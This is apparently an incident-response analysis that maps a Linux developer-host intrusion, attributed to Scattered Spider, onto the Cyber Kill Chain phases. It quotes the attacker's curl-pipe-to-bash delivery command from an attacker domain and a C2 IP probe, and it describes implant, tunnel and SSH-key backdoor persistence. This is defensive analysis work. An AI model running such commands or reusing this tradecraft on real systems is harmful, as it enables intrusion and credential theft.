# Cyber Kill Chain Mapping
### Operation Greenfield | GF-DEV01 Intrusion Analysis

---

### Phase 1 — Reconnaissance
Attacker identified `a.kumar` as a target developer account with access to GF-DEV01. Knowledge of the target environment was sufficient to select a low-privilege developer account as the entry point, avoiding high-privilege accounts that would trigger immediate alerting.

---

### Phase 2 — Weaponization
`install.sh` was prepared to download, chmod, and nohup launch the `helix-update` Sliver implant. A two-stage payload was constructed — `install.sh` drops `helix-update`, and a second stage later drops `helix-sync` (Ligolo tunnel). Both were hosted behind Cloudflare-fronted infrastructure at `dl.abordsecurity.space` and `sync.abordsecurity.space`.

---

### Phase 3 — Delivery
```
curl -fsSL https://dl.abordsecurity.space/install.sh | bash
```
Executed under `a.kumar`'s interactive session. CLOSED-5 caught the DNS lookup for the delivery domain and was dismissed as a false positive. Living-off-the-land delivery — `curl` and `bash` are native tools, no malicious binary touched disk at this stage.

---

### Phase 4 — Exploitation
No CVE exploited. Valid account abuse — the script executed in `a.kumar`'s interactive shell context using native OS tools. The environment did the work.

PID chain: `32260 → 34608 → 34609 → 34616`

Scattered Spider consistently avoids exploits — social engineering and valid account abuse is core tradecraft. The victim's developer account had insufficient monitoring on interactive shell activity.

---

### Phase 5 — Installation
- `helix-update` daemonized via nohup (PPID 1) — Sliver C2 implant running silently under systemd
- `helix-sync` installed as persistent systemd service via `systemctl enable + start`
- Backdoor SSH key (`octotempest@operator`) written to `a.kumar`'s `authorized_keys`

GF-DEV01 itself became adversary infrastructure — a jump host for lateral movement attempts.

Three artefacts left behind: `helix-update` (running), `authorized_keys` (persistent), `helix-sync` (dormant)

---

### Phase 6 — Command & Control
Sliver C2 implant beaconed via Cloudflare-fronted infrastructure. Ligolo tunnel (`helix-sync`) established for encrypted traffic routing. Attacker returned manually as `sancadmin` 104 minutes after implant daemonized.

- **C2 infrastructure:** `194.36.110.139:9080`
- **Cloudflare fronting:** 104.16.x.x / 104.21.x.x
- **Detection:** `HackTool:Linux/Ligolo.A!MTB` — Microsoft Defender for Cloud

Operator probed the C2 listener late session via `curl -I http://194.36.110.139:9080/` — aware of detection risk.

---

### Phase 7 — Actions on Objectives (Failed)
Credential harvesting succeeded — `aws_creds`, `kube_creds`, `ssh_user_keys` harvested from GF-DEV01.

All lateral movement failed:
- **SMB** — RC=1, file delivery failed
- **WinRM** — RC=1, remote execution failed
- **Ligolo** — C2 tunnel established
- **WMI** — RC=0 locally, no confirmed execution on Windows
- **SAMR enumeration** on GF-DC01 via `t.harris` — succeeded but no further access gained

The operator never landed beyond GF-DEV01. `sancadmin` retreated.

---

### Where the Kill Chain Breaks Down
The model has no retreat phase. The operator failed and withdrew — but the machine remained fully compromised. The implant was still running, the backdoor was still active, and the operator could return at any time. The Kill Chain shows a linear progression to objectives; it cannot capture the persistence of capability after a failed operation. For that, see the Diamond Model mapping.
